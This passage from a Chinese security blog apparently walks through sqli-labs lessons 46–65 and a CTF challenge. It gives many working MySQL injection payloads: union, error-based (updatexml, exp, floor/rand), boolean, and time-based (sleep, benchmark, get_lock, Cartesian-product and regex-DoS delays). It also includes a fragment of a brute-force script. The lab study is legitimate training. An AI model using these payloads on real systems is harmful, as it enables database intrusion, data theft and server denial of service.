by后面不能跟union，只能老老实实的and</p><p><strong>综上真正的解题思路</strong><br>在less46的基础上构造语句闭合单引号即可</p><ul><li>  基于bool：<code>sort=1&#39; and rand(ascii(left(database(),1))=115)--+</code></li><li>  基于报错：<code>sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))limit 0,1)--+</code></li><li>  基于时间：<code>1&#39; and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+</code></li></ul><p><strong>最后一次被打脸</strong><br>我尝试下bool的报错，他是存在问题的，不能以这种方式正常注入（当然也通过测试，发现一个有意思的现象）<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-22.gif"/><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-06-12 00-24.gif"/><br>上面那个图是less47的，下面是less46的<br>对于less47，反复执行的话，结果就那三样不断地切换<br>对于less46，反复执行的话，结果始终唯一且不同<br>就因为多了一个sort=’1’ and，就导致结果这样反复原因暂时不打算深究，打住即可<br><strong>目前定棺结论：</strong><br>针对含单引号的Order by的地方优先报错，如果报错信息被注释则尝试时间延迟，最后在考虑rand函数的报错，rand太不稳定了《天书》里面失败了，我的环境也失败，也就说明这是个共性问题了<br>而没有单引号 int型的order By 则可以放心大胆的使用order by。虽然非order by 0 或者order by 1的结果，毕竟rand返回值不可能只有0 1两个返回值，但是唯一可以保证的是rand(true)和rand(false)两个返回的排序结果是唯一且不同的</p><h3 id="less48之int型-盲注"><a href="#less48之int型-盲注" class="headerlink" title="less48之int型_盲注"></a>less48之int型_盲注</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p></blockquote><p>和less46的区别在于注释掉了报错信息，无非不能执行报错注入而已</p><h3 id="less49之string型-盲注"><a href="#less49之string型-盲注" class="headerlink" title="less49之string型_盲注"></a>less49之string型_盲注</h3><blockquote><p><code>$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code></p></blockquote><p>和less47的区别在于注释掉了报错信息，无非不能执行报错注入而已</p><h2 id="order-by-堆叠注入"><a href="#order-by-堆叠注入" class="headerlink" title="order by+堆叠注入"></a>order by+堆叠注入</h2><h3 id="less50之int型"><a href="#less50之int型" class="headerlink" title="less50之int型"></a>less50之int型</h3><p>和less46相比，使用了mysqli_multi_query()函数来执行sql命令<br>因此除了使用46的那些方法，还可以使用less39构造堆叠注入的方法</p><h3 id="less51之string型"><a href="#less51之string型" class="headerlink" title="less51之string型"></a>less51之string型</h3><p>和less47相比，使用了mysqli_multi_query()函数来执行sql命令<br>因此除了使用47的那些方法，还可以使用less38构造堆叠注入的方法</p><h3 id="less52之int型-盲注"><a href="#less52之int型-盲注" class="headerlink" title="less52之int型_盲注"></a>less52之int型_盲注</h3><p>和 less50 是一样的<br>只是这里的 mysql 错误不会在前台显示,但是对于 stacked injection 是一样的利用方式</p><h3 id="less53之string型-盲注"><a href="#less53之string型-盲注" class="headerlink" title="less53之string型_盲注"></a>less53之string型_盲注</h3><p>和 less51 是一样的<br>只是这里的 mysql 错误不会在前台显示,但是对于 stacked injection 是一样的利用方式</p><hr><h1 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h1><p>限制了次数，核心在于想让我们去优化我们的请求代码！</p><h2 id="限制查询次数"><a href="#限制查询次数" class="headerlink" title="限制查询次数"></a>限制查询次数</h2><h3 id="less54之单引号"><a href="#less54之单引号" class="headerlink" title="less54之单引号"></a>less54之单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote><p>接合information表+采用联合注入的爆库版本即可</p><ul><li>   查表：<code>id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+</code>===》<code>40S9NXOMUW</code></li><li>   查字段：<code>?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;40S9NXOMUW&#39;--+</code>===》<code>id,sessid,secret_L3Q4,tryy</code></li><li>   查内容：<code>?id=-1&#39;union select 1,2,group_concat(sessid,secret_L3Q4) from 40S9NXOMUW--+</code>===》<code>25824988925b5fd75ef84e8202957b74TkM2Olgza5JdRAJmbAW7AtmZ</code><h3 id="less55之整型-括号"><a href="#less55之整型-括号" class="headerlink" title="less55之整型+括号"></a>less55之整型+括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less56之单引号-括号"><a href="#less56之单引号-括号" class="headerlink" title="less56之单引号+括号"></a>less56之单引号+括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less57之双引号-括号"><a href="#less57之双引号-括号" class="headerlink" title="less57之双引号+括号"></a>less57之双引号+括号</h3><blockquote><p><code>$id= &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p></blockquote><h2 id="限制查询次数-禁止结果显示"><a href="#限制查询次数-禁止结果显示" class="headerlink" title="限制查询次数+禁止结果显示"></a>限制查询次数+禁止结果显示</h2><h3 id="less58之单引号"><a href="#less58之单引号" class="headerlink" title="less58之单引号"></a>less58之单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote></li></ul><p>基于报错+information表</p><ul><li>   查表：<code>?id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),0x7e),1)--+</code>===&gt;<code>XPATH syntax error: &#39;~J68QHCWZVP~&#39;</code></li><li>   查字段：<code>?id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;J68QHCWZVP&#39;),0x7e),1)--+</code>===》<code>XPATH syntax error: &#39;~id,sessid,secret_9YBW,tryy~&#39;</code></li><li>   查内容：<code>id=-1&#39;union select 1,1,updatexml(1,concat(0x7e,(select group_concat(secret_9YBW) from J68QHCWZVP),0x7e),1)--+</code>====》<code>XPATH syntax error: &#39;~VckmCqkD23dokvvfaBaYfncI~&#39;</code><blockquote><p>注意这里是基于报错，而updatexml的第二个参数只需要一个，而非三个<br>此时就要把54的payload改一下，54那个为了和前面的列数相匹配，多了select 1,2,xxx，如果58这里还这样会报错<code>Operand should contain 1 column(s)</code>，把1,2删掉，直接select groupxxx即可</p></blockquote><h3 id="less59之整型"><a href="#less59之整型" class="headerlink" title="less59之整型"></a>less59之整型</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less60之双引号-括号"><a href="#less60之双引号-括号" class="headerlink" title="less60之双引号+括号"></a>less60之双引号+括号</h3><blockquote><p><code>$id = &#39;(&quot;&#39;.$id.&#39;&quot;)&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less61之单引号-双括号"><a href="#less61之单引号-双括号" class="headerlink" title="less61之单引号+双括号"></a>less61之单引号+双括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code></p></blockquote><h2 id="限制查询次数-禁止结果显示-禁止报错信息"><a href="#限制查询次数-禁止结果显示-禁止报错信息" class="headerlink" title="限制查询次数+禁止结果显示+禁止报错信息"></a>限制查询次数+禁止结果显示+禁止报错信息</h2><h3 id="less62之单引号-括号"><a href="#less62之单引号-括号" class="headerlink" title="less62之单引号+括号"></a>less62之单引号+括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p></blockquote></li></ul><p>他这里限制了130次，我觉得基本不可能….<br>这里感觉就只能就像最初的爆破脚本的爆破</p><ul><li><p>   直接构造<code>?id=1&#39;)and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=74--+</code><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612223744.png" alt="20190612223744.png"></p><blockquote><p>当然我这个是开了上帝视角，用Mysql命令行尝试过，这里只是想表示他可以正常执行</p></blockquote></li><li><p> 基于报错<code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,exp(710))--+</code><br>   <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612223956.png" alt="20190612223956.png"></p></li><li><p>   基于时间<code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,sleep(10))--+</code></p><h3 id="less63之单引号"><a href="#less63之单引号" class="headerlink" title="less63之单引号"></a>less63之单引号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less64之双括号"><a href="#less64之双括号" class="headerlink" title="less64之双括号"></a>less64之双括号</h3><blockquote><p><code>$sql=&quot;SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less65之双引号-括号"><a href="#less65之双引号-括号" class="headerlink" title="less65之双引号+括号"></a>less65之双引号+括号</h3><blockquote><p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code><br><code>$sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;</code></p></blockquote><h3 id="less65-75"><a href="#less65-75" class="headerlink" title="less65~75"></a>less65~75</h3><p>然而源代码里面并没有</p></li></ul><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><ol><li>能明注最好，但是基本很少</li><li>盲注能报错注入，肯定优先报错注入</li><li>在考虑布尔爆破，布尔又分普通直接爆，配合报错爆，配合时间爆。肯定优先第一中，因为最直接。但是很多情况是属于，你结果集是否为空，都返回相同的内容，比如CISCN的全宇宙最简单sql那道题。所以就需要配合报错或者配合时间报错，由于时间的费时以及不确定性，因此优先配合报错爆</li><li>核心在于猜解他背后的sql语句的结构，以及waf措施，从而进行闭合绕过bypass，然后进行注入</li><li>不拘泥于一个参数username，可能还是password；不拘泥于–+ # 还有/***/；不拘泥于select 还有updata insert delete，而这个则需要掌握他的结构，灵活利用union and等是否合法</li><li>思维不要有局限性</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>靶场</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF引发的对报错注入的深入学习</title>
    <link href="/2019/05/15/%5Bold%5DCTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/05/15/%5Bold%5DCTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>因为2019全国信安大赛的“全宇宙最简单的SQL”这道题的注入，所以会偏向于报错注入，针对这道题比较多，没耐心的可以直接看置顶的那篇文章，师傅整理的很全<a href="https://www.anquanke.com/post/id/170626?from=timeline">传送门</a></p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>对于版本小于5.0的MySQL数据库，以及部分有WAF干扰的版本大于5.0的MySQL数据库，你就无法轻易获得表名、列名。<br>在这种情况下，也许你会放弃，仅仅注入出数据库名字，证明漏洞存在就结束。<br>那么如何在不知道MySQL列名的情况下注入出数据？<a href="https://nosec.org/home/detail/2245.html">传送门</a><br><strong>payload：</strong><br><del>-1’ union select 1,(select4from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)–</del><br>1‘ union select 1,(select a.4 from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)–<br><strong>解释</strong><br>一、 select 1,2,3,4,5,6 union select * from users 的意思大概是前面的123456形成表列的列名，后面select的结果集为表格中的内容</p><blockquote><ul><li> mysql版本：5.7.26-0ubuntu0.18.04.1 ，基本算是我目前的最新版本</li></ul></blockquote><ul><li>  记得联合查询而且由于union的特性记得前后两个的列数要相同，前面select 12345的数字多少取决于后面有几列</li><li>select出来的结果集之后必须加上别名a<br>  前面的不能仅仅是2或者是‘2’(上面的文章虽然’2’可以)，但是a.2会更加合适（当前别名不一定是a，你随意啦！）</li><li>  limit 1,1的用法百度即可</li></ul><p>二、 <code>1 union select</code>后面为啥还要加个1?<br>不然会报错！因为这个地方前面的sql语句是user,password两列，union前后的列数要相同，1的目的就是为了充数。<br>如果前面是select user,password,age from where use=，此时你注入payload就应该是1,2，selectb巴拉巴拉的</p><h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>①</strong><br>他只有数据库操作出错和用户名密码错误这两种状态，而我们传统的是结果正确或者错误这两个状态。这也就一定的困难</p><blockquote><p><del>我们如何判断我们输入正确了呢?</del><br>输入正确肯定返回结果啊<br>问题的核心在于：我们不知道密码，所以需要sql注入操作出密码！<br>我们原来的是sql，判断sql出来的字符x是否等于另一个我们已知的字符，然后返回结果，根据结果的01来逐个猜解字符<br>而这里：sql操作语法错误 返回数据库操作出错，sql操作语法正确，密码错误返回用户名密码出错<br>问题是我们的操作正确了，但是sql判断字符的结果是1还是0还是其他我们就无法根据返回结果判断<br><strong>思路</strong><br>我们在判断的结果外面在套一层东西，使得套之后达到的效果为：如果判断的结果为1，则使得数据库操作出错，如果为0，则sql操作正确使得用户名伙密码出错<br>然后根据这个绕一圈，多一个步骤的方法来获得和之前一样的效果</p></blockquote><p><strong>②</strong><br>经过测试：or被过滤无法从information_schema获取表名，字段等信息<br>同时也无法查看password这一列的信息</p><blockquote><p>补充：正则匹配字符串中的or，匹配到了就报错。password和information中都含有or这两个字母</p></blockquote><p>这个时候就可以用到一开始基础里面提到的方法</p><h2 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h2><ol><li>基于报错</li><li>1 exp函数<br>利用<strong>exp函数的参数在大于709的情况下会导致sql语句执行失败</strong>，这样其实就找到了一种方法来利用服务端的两种不同回显来判断我们自定义表达式的真假。比如这个表达式是709 + c - ascii(‘a’)，让c初始化为126（最大可见字符），我们把它作为参数传给exp函数，这时sql语句必然是执行失败的，因为709 + 126 - ascii(‘a’) &gt; 709。然后我们不断的c–，直到c == ascii(‘a’)，那么就相当于exp(709 + c - c) == exp(709)，sql语句就会执行成功，这时的c就是ascii(a)，利用这种思路就可以进行盲注了</li></ol><blockquote><p>payload:username=’^(select exp(~((select ( (( select c.b from (select 1 as a,2 as b,3 as d from user union select from user)c where a=’admin’ )) ))18446744073709551615)))#&amp;password=admin</p><blockquote><p>补充的payload：甲鱼学长是exp(10100乘以上述字符判断返回的01结果，10001&gt;709,1000*0&lt;&lt;709.他的脚本太骚了!!!Python占位符用的太灵活了以至于….</p><blockquote><p>payload = “1’ union select exp(8011(select %s)) +–+”<br>payloads = “ascii(substr((select group_concat(qaq.2) from (select 1,2 union select * from user)qaq),%d,1))=%d”<br>payloads = payload % payloads<br>datas = “”<br>string = “”<br>for x in range(3,50):<br>lens = 1000000<br>for j in range(127):<br>i = 127-j<br>datas = “”<br>data[“username”] = payloads % (x, i)<br>/#print(data[“username”])<br>for z in data.keys():<br>datass = z + “=” +data[z] + “&amp;”<br>datas += datass<br>s = requests.post(url, data=datas, headers=header, allow_redirects = False)<br>….</p></blockquote></blockquote></blockquote><p><strong>1.2 基于溢出的报错</strong><br><a href="https://www.cnblogs.com/kagari/p/10758155.html">传送门</a><br>～0:0取反之后就是最大数，最大数+1就溢出则sql操作失败<br><strong>payload</strong></p><blockquote><p>“‘ and (select (asciizhuangtait.2 from (select 1,2 fzhuangtaiSELECT * from user )t zhuangtai1),{i},1))={j})+~0)#”.zhuangtai</p><blockquote><p>i=i,j=j前面的i指的是该语句中的{1}，后面的是脚本中外面for循环循环变量递增的i。类似于{1}，format(1=i)，j同理</p></blockquote></blockquote><p>还有：pow(9999，100)去乘以结果，这个表达式的值在 MYSQL 中已经超出 double 范围，会溢出<br>其他数学函数可以发挥想象！</p><p><strong>1.3 骚操作</strong></p><blockquote><p>对我而言很新颖，求表哥轻喷</p></blockquote><p>由于and的特性:前面为假 则后面的不执行直接返回结果为假，前面为真才返回结果为真<br>and的短路骚操作<a href="https://xz.aliyun.com/t/4904">传送门</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190422203420-f3e098fc-64fa-1.png"></p><blockquote><p>payload:admin’^1 and substr((select 2 from (select 1,2 union select * from user)a limit 1,1),%d,1)=’%s’ and pow(9999,100)#” % (i,char)</p><blockquote><p>前面的语句正确，由于and就会执行下面的语句从而产生溢出报错。前面的语句错误后面的也就不会执行</p></blockquote></blockquote><p>其实我觉得有问题，但是说不出来，感觉就是最后的结果是select xxx from xxx where 0？<br>还有这种语法？于是自己还是试验了一波</p><p><strong>后续更新：</strong><br>找了下and,or的w3c官方解释<a href="http://www.w3school.com.cn/sql/sql_and_or.asp">传送门</a><br>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。<br>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。`</p><p><strong>by the way</strong><br>除了and，IF()也不是说不行对吧！<br>IF（1/0，报错操作，0）</p><ol start="2"><li> 基于时间延迟的时间盲注<br>虽然sleep包括BENCHMARK等函数也被过滤了。但是寻找其他的时延函数<br>然后还是和上面1.1的and一样，如果前面为真，则进行时延，为假则不进行时间延迟<br>正则DOS，效果类似于sleep：<a href="https://xz.aliyun.com/t/4906#toc-7">传送门</a><blockquote><p><code>payload:admin’^(select+(select b from (select 1 as a,2 as b from user where 1=2 union select from user) b) like’f1ag%’+and+concat(rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’))+RLIKE+’(a.)%2b(a.)%2b(a.)%2b(a.*)%2bb’)^’1’%3d’1#</code></p><blockquote><p>concat后面的巴拉巴拉的等同于sleep(5)的效果参考某次白帽大会的议题.<a href="https://www.cesafe.com/3993.html">传送门</a><br>搜到上面的方法，进而让我引申出来了还有<a href="https://www.anquanke.com/post/id/170626?from=timeline">笛卡尔积</a>的方法？excuse me？笛卡尔积：上面那个白帽大会的网页里也有说.<br>看了这个之后发现还有get_lock()加锁机制？长亭的pwnhub解释<a href="https://mp.weixin.qq.com/s/bDeztHrOF2S6wf_nBFVeOg">传送门</a><br>骚操作一个接一个<br>由于篇幅原因，根据我上面的网页，大家可以自行探索</p></blockquote></blockquote></li></ol><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>floor报错注入也可以的</strong><br>核心在于：rand()，group by。这个组合在一起会发生化学反应<br>即产生ERROR 1062 (23000): Duplicate entry ” for key ‘name’的<a href="https://www.fujieace.com/mysql/error-1062-23000-duplicate-entry.html">错误</a></p><blockquote><p>出现这个问题的原因就是“唯一索引”引起的！<br>而导致主键的键值重复的原因就是上面的两个函数的组合。</p></blockquote><p>上面两个关键词为什么可以产生这种化学反应呢？<br>解释参考下面三篇文章<br>浅显易懂<a href="https://www.cnblogs.com/litlife/p/8472323.html">传送门</a><br>进阶版<a href="https://blog.51cto.com/chichu/2051375">传送门</a><br>深刻:很长，主要原因是图片插的有点多，初次看看结论即可<a href="https://www.cnblogs.com/xdans/p/5412468.html">传送门</a></p><blockquote><p>对上面的“深刻”这篇文章的总结：<br>0. 报错只和rand和order by有关</p></blockquote><ol><li> 报错与(floor(rand(0)2)位置无关</li><li> floor(rand(0)2)报错是有条件的，表的记录必须3条以上，而且在3条以上必定报错</li><li> rand(0)*2以及floor()函数组合只是成功的几率更高（你也可以自己好找到更好的，比如乘以3，rand(996)？）</li></ol><p><strong>payload的总结：</strong><br>by the way：concat的作用是 使得插入表中的内容是”xxxxx1“和“xxxxxx0”，这样报错显示主键重复的也是”xxxxx1”，从而达到一般的sql注入效果（xxx为你想要得到的内容）<br>在此处你可以考虑比如在floor(rand(0)*2)后面乘以你想要判断的结果（0和1）进而实现逐字母的爆破</p><h1 id="报错注入深入学习"><a href="#报错注入深入学习" class="headerlink" title="报错注入深入学习"></a>报错注入深入学习</h1><p>十多个:floor,updatexml(),extractvalue(),还有一个大综合<a href="https://blog.csdn.net/whatday/article/details/63683187">传送门</a><br>大多数人习惯用floor,updatexml(),extractvalue(),其实还有很多函数会导致mysql报错并显示出数据<br>前面已经介绍过floor，这里会在拓展一些</p><blockquote><p>这些方法并不是所有版本通用，比较老的版本并没有这些函数</p></blockquote><h2 id="UpdateXml-和extractValue"><a href="#UpdateXml-和extractValue" class="headerlink" title="UpdateXml()和extractValue()"></a>UpdateXml()和extractValue()</h2><blockquote><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p></blockquote><h3 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml()"></a>UpdateXml()</h3><p><strong>payload</strong>:xxx/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p><blockquote><p><strong>分析</strong>：concat()函数是将其连成一个字符串，而updatexml第二个参数需要的是Xpath格式的字符串，我们输入的显然不符合。故报错由此报错。因此不会符合XPATH_string的格式，从而出现格式错误，爆出敏感信息<br><strong>补充</strong>：0x7e的ASCII码,实为~ ,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母前面的数字等内容丢失,所以在开头连接一个特殊字符~<br>注意返回长度有限,均为32个字符长度。（PS：但是应对大多的已经足够）如果密码长度超过了32位就不会被显示出来。</p></blockquote><h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue()"></a>extractValue()</h3><p>payload:xxx/a.php?id=1 and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));</p><blockquote><p>其他东西和updataxml一样</p></blockquote><h3 id="区别和联系"><a href="#区别和联系" class="headerlink" title="区别和联系"></a>区别和联系</h3><ul><li>EXTRACTVALUE(XML_document, XPath_string);<ul><li>  extractvalue(目标xml文档，xml路径)</li><li>  从目标XML中返回包含所查询值的字符串</li></ul></li><li>UPDATEXML(XML_document, XPath_string, new_value);<ul><li>  updatexml(目标xml文档，xml路径，更新的内容)</li><li>  更新文档中符合条件的节点的值</li></ul></li></ul><h3 id="七个葫芦娃"><a href="#七个葫芦娃" class="headerlink" title="七个葫芦娃"></a>七个葫芦娃</h3><ol><li><p> exp():函数执行返回0,0取反产生溢出</p><blockquote><p>1 and exp(~(select * from(select user())a));</p></blockquote></li><li><p> GeometryCollection()</p><blockquote><p>id = 1 AND GeometryCollection((select from (select from(select user())a)b))</p></blockquote></li><li><p> polygon()</p><blockquote><p>id =1 AND polygon((select from(select from(select user())a)b))</p></blockquote></li><li><p> multipoint()</p><blockquote><p>id = 1 AND multipoint((select from(select from(select user())a)b))</p></blockquote></li><li><p> multilinestring()</p><blockquote><p>id = 1 AND multilinestring((select from(select from(select user())a)b))</p></blockquote></li><li><p> linestring()</p><blockquote><p>id = 1 AND LINESTRING((select from(select from(select user())a)b))</p></blockquote></li><li><p> multipolygon()</p><blockquote><p>id =1 AND multipolygon((select from(select from(select user())a)b))</p></blockquote></li></ol><p>貌似被修复了！！！至少在我的Ubuntu的5.7版本和虚拟机phpstudy的5.5版本无效，但是&lt;代码审计&gt;的书上，以及上面网页中实验有效。具体那个版本不得而知！<br>除了1.的exp函数，2~6函数都是几何类型的函数，原理和<strong>UpdateXml()和extractValue()差不多：都是基于类型的不匹配从而导致的出错。除了exp，剩下的能不能用看命TAT</strong></p><h1 id="时间延迟探索"><a href="#时间延迟探索" class="headerlink" title="时间延迟探索"></a>时间延迟探索</h1><p>五种方法<a href="https://www.cdxy.me/?p=789">传送门</a></p><h2 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h2><p>sleep函数说的很多了,大多都是 select * from user where id=1’and if(0,sleep(5),1);<br>但是我想补充一点，通过这种方法也可以间接猜解结果集的行数</p><blockquote><p>select sleep(1),name from animals</p><blockquote><p>即当后面有一个名字，sleep就执行一次，结果集越多，函数执行次数越多</p></blockquote></blockquote><h2 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h2><p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式<br>比如：benchmark(10000000,md5(‘a’))，或者sha1,达到sleep一样的时间延迟效果</p><blockquote><p>由于对服务器性能的大量占用，会影响正常用户的使用，很容易被管理员检测到！</p></blockquote><h2 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock()"></a>get_lock()</h2><blockquote><p>  在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)<br>然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。</p></blockquote><p><strong>优点</strong>：延时精确可控，<br><strong>缺点</strong>：利用环境有限,需要开两个session测试<br>而且注意必须要是持久性的链接才可以，因为非持久链接，会导致前面get_lock的加锁，但是对下一个session无效<br><a href="https://mp.weixin.qq.com/s/bDeztHrOF2S6wf_nBFVeOg">pwnhub这道题</a>可以利用，因为使用了<strong>mysql_pconnect</strong>函数来连接数据库。</p><p>既然有危害，那么为什么有的服务器会开持久链接？<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708144129.png" alt="20190708144129.png"></p><blockquote><p>注意下他的总结：如果讲持久链接替换为非持久链接时，你自己payload脚本进行先进行第一次session加锁，由于非持久链接，二次session就无效了，此时脚本行为就发生改变了。因此get_lock函数利用环境有限！</p></blockquote><h2 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h2><p>进行多表合并，耗费较长时间，达到延时的效果</p><blockquote><p>SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</p><blockquote><p>对于information_schema而言三个就差不多了，太大了可能会导致超时。（我两个schema表0.36s返回结果9486400，三个就直接卡了几分钟还没出来，笔记本电扇嗡嗡响就暂时作罢，太耗资源了，9486400^3080太大了）<br>其他的表可以自由发挥</p></blockquote></blockquote><p>为什么用schema表？其他表不可以吗？</p><blockquote><p>The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.</p><blockquote><p>因为其他表不可知，而且执行的延迟时间取决于笛卡尔积的量，普通表的数量太小了….</p></blockquote></blockquote><h3 id="正则DOS之RLIKE"><a href="#正则DOS之RLIKE" class="headerlink" title="正则DOS之RLIKE"></a>正则DOS之RLIKE</h3><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><blockquote><p><code>concat(rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’)) RLIKE ‘(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.*)+b’</code></p></blockquote><p>以上代码等同于 sleep(5)</p><h3 id="关于heavy-query请求的补充说明"><a href="#关于heavy-query请求的补充说明" class="headerlink" title="关于heavy-query请求的补充说明"></a>关于heavy-query请求的补充说明</h3><p>对于笛卡尔积，正则ODS，benchamark都会导致服务器资源的占用，容易被管理员识别。<br>同时由于sql的优化机制，会将每次结果存起来，从而导致下次查询基本秒回，再者如果查询多次都错误，sql也会下次直接判断你错误而不执行函数<br>所以为了每次程序的正常执行，最好一次一个sql语句，比如次数4999变成4998依次类推</p><blockquote><p>As mentioned in the article about time-based attacks, the heavy query approach will have noticeable impacts on CPU and server resources usage. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.<br>You must also be aware that the injected query will most likely be executed only once. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results you should always try to generate a WHERE clause that will be verified for at least one record.</p><blockquote><p><a href="http://www.sqlinjection.net/heavy-query/">http://www.sqlinjection.net/heavy-query/</a></p></blockquote></blockquote><p>但是相比报错型注入，他不会被logs记录<br>同时补充上面他的缺点如下<br>一方面服务器载荷和网络速度对响应时间也会产生巨大的影响，因此你需要暂停足够时间以确保这些不确定因素影响到你最后的结果，另一方便延迟要在合理的时间之类，由于延迟时间的不可知性，注入就很苦难</p><blockquote><p>One main advantage of this technique is to have little to no impact on logs, especially when compared to error-based attacks. However, in situations where heavy queries or CPU intensive functions like MySQL’s BENCHMARK() must 